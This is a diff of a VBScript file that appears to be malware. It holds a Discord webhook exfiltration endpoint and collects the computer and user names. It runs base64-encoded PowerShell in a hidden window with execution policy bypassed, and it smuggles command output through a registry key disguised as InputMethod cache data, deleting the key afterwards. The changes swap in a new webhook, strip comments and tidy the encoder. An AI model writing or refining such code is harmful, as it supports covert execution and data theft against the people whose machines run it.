@@ -6,51 +6,30 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1561569782438953011/GlAsXcz1Fp-xyuzGDnM_hU0QZ8oqztvb60jrp93s_ysFbIoflLA9ylAhj6mstM2peP_J"
+WH   = "https://discord.com/api/webhooks/1561899372134924359/gOeNA944tg1wj9CV8ujkN4SR6sptB1M5b3hG8Qv41uLKCwbfYrgd_8rDoym67-bW9p_G"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' Base64 encode a string for -EncodedCommand (UTF-16LE)
 Function B64EncodePS(s)
-    Dim bytes(), i, b64
-    ReDim bytes(Len(s) * 2 - 1)
-    For i = 1 To Len(s)
-        bytes((i-1)*2)   = Asc(Mid(s, i, 1))
-        bytes((i-1)*2+1) = 0
-    Next
-    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
-    Dim el  : Set el  = xml.createElement("b64")
-    el.DataType = "bin.base64"
-    Dim stream : Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    Dim bArr() : ReDim bArr(UBound(bytes))
-    For i = 0 To UBound(bytes) : bArr(i) = bytes(i) : Next
-    ' write bytes via ADODB
-    stream.Write ChrB(0) ' placeholder — use DOM node approach below
-    stream.Close
-    ' Cleaner: use Scripting.Dictionary trick won't work; use WScript.Shell to base64
-    ' Actually use the XMLDOM binary node approach:
-    Set el = Nothing : Set xml = Nothing : Set stream = Nothing
-
-    ' Use a temp-free approach: encode via MSXML2 binary node
-    Dim doc : Set doc = CreateObject("MSXML2.DOMDocument.6.0")
-    Dim node : Set node = doc.createElement("tmp")
-    node.DataType = "bin.base64"
-    ' Build byte array string for bin.hex then convert
-    Dim hexStr : hexStr = ""
+    Dim i, hexStr
+    hexStr = ""
     For i = 1 To Len(s)
         Dim lo : lo = Asc(Mid(s, i, 1))
         hexStr = hexStr & Right("0" & Hex(lo), 2) & "00"
     Next
-    Dim node2 : Set node2 = doc.createElement("tmp2")
-    node2.DataType = "bin.hex"
-    node2.Text = hexStr
-    node.nodeTypedValue = node2.nodeTypedValue
-    B64EncodePS = node.Text
-    B64EncodePS = Replace(B64EncodePS, Chr(10), "")
-    B64EncodePS = Replace(B64EncodePS, Chr(13), "")
-    Set node = Nothing : Set node2 = Nothing : Set doc = Nothing
+    Dim doc  : Set doc  = CreateObject("MSXML2.DOMDocument.6.0")
+    Dim nHex : Set nHex = doc.createElement("h")
+    nHex.DataType = "bin.hex"
+    nHex.Text = hexStr
+    Dim nB64 : Set nB64 = doc.createElement("b")
+    nB64.DataType = "bin.base64"
+    nB64.nodeTypedValue = nHex.nodeTypedValue
+    Dim result : result = nB64.Text
+    result = Replace(result, Chr(10), "")
+    result = Replace(result, Chr(13), "")
+    result = Replace(result, " ", "")
+    B64EncodePS = result
+    Set nHex = Nothing : Set nB64 = Nothing : Set doc = Nothing
 End Function
 
 Function RunPS(code)
@@ -63,26 +42,22 @@ Function RunPSAsync(code)
     sh.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & enc, 0, False
 End Function
 
-' Run PS and capture output via WMI stdout capture (no temp file)
 Function RunPSCapture(code)
-    ' Write to a named pipe substitute: use env var channel via registry
-    ' Cleanest no-disk approach: append output key to HKCU registry, read back
     Dim regKey : regKey = "HKCU\Software\Microsoft\InputMethod\Results"
     Dim regVal : regVal = "CacheData_" & CStr(Int(Timer * 1000))
 
     Dim wrapped : wrapped = _
+        "$rp = 'HKCU:\Software\Microsoft\InputMethod\Results';" & _
+        "if (-not (Test-Path $rp)) { New-Item -Path $rp -Force | Out-Null };" & _
         "$out = (" & code & " | Out-String).Trim();" & _
         "if (-not $out) { $out = 'NOT_FOUND' };" & _
-        "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\InputMethod\Results' " & _
-        "-Name '" & regVal & "' -Value $out -Force"
+        "Set-ItemProperty -Path $rp -Name '" & regVal & "' -Value $out -Force"
 
     Dim enc : enc = B64EncodePS(wrapped)
     sh.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & enc, 0, True
 
-    ' Read result back from registry
     On Error Resume Next
     Dim result : result = sh.RegRead(regKey & "\" & regVal)
-    ' Clean up the registry key
     sh.Run "powershell -NoP -NonI -W Hidden -Command ""Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\InputMethod\Results' -Name '" & regVal & "' -EA SilentlyContinue""", 0, False
     On Error GoTo 0
     RunPSCapture = result
